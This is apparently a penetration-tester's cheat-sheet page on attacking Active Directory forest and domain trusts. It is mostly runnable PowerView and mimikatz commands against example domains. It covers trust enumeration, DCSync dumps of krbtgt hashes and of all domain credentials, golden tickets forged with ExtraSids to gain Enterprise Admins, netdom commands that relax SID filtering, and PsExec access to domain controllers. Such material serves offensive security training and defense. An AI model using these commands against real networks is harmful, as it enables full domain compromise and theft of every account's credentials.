---
layout: page
title: "AD Forest & Trust Attacks"
---

# AD Forest & Trust Attacks

Forest trusts connect separate AD forests. By default, SID filtering prevents credentials from one forest from granting access in another. But when SID filtering is relaxed for migration purposes, or when child-parent domain trust is present, a compromised forest root becomes a path into trusting forests.

## Enumerate Trusts

```powershell
powershell -ep bypass
. .\powerview.ps1

# List all trusts from current domain
Get-DomainTrust
Get-DomainTrust -Domain corp1.com

# List forest trusts
Get-ForestTrust

# Enumerate domains in a forest
Get-ForestDomain

# Enumerate foreign group memberships (cross-domain)
Get-DomainForeignGroupMember
Get-DomainForeignGroupMember -Domain corp2.com
```

## Child-to-Parent Escalation (Extra SIDs)

When you control a child domain (`prod.corp1.com`), the `krbtgt` hash of the child lets you forge a TGT with the Enterprise Admins SID of the parent forest in the `ExtraSids` field.

```powershell
# Get krbtgt hash of child domain
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

# Get domain SIDs
Get-DomainSID -Domain prod.corp1.com
# S-1-5-21-3776646582-2086779273-4091361643

Get-DomainSID -Domain corp1.com
# S-1-5-21-1587569303-1110564223-1586047116

# Enterprise Admins SID = parent SID + -519
# S-1-5-21-1587569303-1110564223-1586047116-519

# Forge golden ticket with ExtraSids
mimikatz.exe
kerberos::golden /user:h4x /domain:prod.corp1.com \
  /sid:S-1-5-21-3776646582-2086779273-4091361643 \
  /krbtgt:<child_krbtgt_hash> \
  /sids:S-1-5-21-1587569303-1110564223-1586047116-519 \
  /ptt

misc::cmd

# Access parent DC
.\PsExec.exe \\dc01.corp1.com cmd
whoami
# corp1\h4x (member of Enterprise Admins)
```

## Forest-to-Forest with SID Filtering Disabled

SID filtering on forest trusts blocks ExtraSids with RID < 1000 and strips global group memberships. It does not strip membership in domain-local groups with RID >= 1000.

```powershell
# Check if SID filtering is relaxed (run on the trusting forest's DC)
netdom trust corp2.com /d:corp1.com /quarantine

# Enable SID history (run on the trusting forest's DC as domain admin)
netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
```

```powershell
# Find domain-local groups in target forest with RID >= 1000
# that are members of privileged groups (e.g., Administrators)
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
# Look for non-default groups (RID > 1000) in the output

# Get the SID of that group
Get-DomainGroup -Identity "powerGroup" -Domain corp2.com | Select-Object objectsid

# Get krbtgt hash of corp1.com (fully compromise it first)
mimikatz.exe
lsadump::dcsync /domain:corp1.com /user:krbtgt

# Get corp1.com SID
Get-DomainSID -Domain corp1.com

# Forge golden ticket with the target forest group SID
kerberos::golden /user:h4x /domain:corp1.com \
  /sid:<corp1_sid> \
  /krbtgt:<corp1_krbtgt_hash> \
  /sids:<corp2_powerGroup_sid> \
  /ptt

misc::cmd

# Access target forest DC
.\PsExec.exe \\dc01.corp2.com cmd
```

## DCSync from Compromised Forest

```powershell
# With Enterprise Admins ticket in memory
mimikatz.exe
lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
lsadump::dcsync /domain:corp1.com /all /csv
```

## Useful Enumeration Across Trusts

```powershell
# Enumerate users in trusted domain
Get-DomainUser -Domain corp2.com

# Enumerate groups in trusted domain
Get-DomainGroup -Domain corp2.com

# Find computers in trusted domain
Get-DomainComputer -Domain corp2.com | select dnshostname

# Map all trust relationships in the forest
Get-DomainTrustMapping
```
